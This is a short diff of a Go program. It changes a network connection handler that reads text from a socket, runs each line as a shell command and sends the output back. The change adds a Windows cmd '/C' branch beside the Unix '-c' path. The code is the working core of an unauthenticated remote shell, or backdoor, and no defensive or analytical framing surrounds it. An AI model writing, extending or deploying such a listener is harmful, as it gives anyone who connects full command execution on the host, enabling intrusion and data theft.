@@ -43,12 +43,20 @@ func listener(comms_data string) {
 func handleRequest(conn net.Conn) {
 	for {
 		message, _ := bufio.NewReader(conn).ReadString('\n')
-		out, err := exec.Command(config.Shell, "-c", strings.TrimSuffix(message, "\n")).Output()
-
+		if (config.Platform == "Windows"){
+			out, err := exec.Command(config.Shell, "/C", strings.TrimSuffix(message, "\n")).Output()
 		if err != nil {
 			fmt.Println("unable to run command,", conn, "%s\n", err)
 		}
 		fmt.Fprintf(conn, "%s\n", out)
+		}else {
+			out, err := exec.Command(config.Shell, "-c", strings.TrimSuffix(message, "\n")).Output()
+		if err != nil {
+			fmt.Println("unable to run command,", conn, "%s\n", err)
+		}
+		fmt.Fprintf(conn, "%s\n", out)
+		}
+
 	}
 }
 
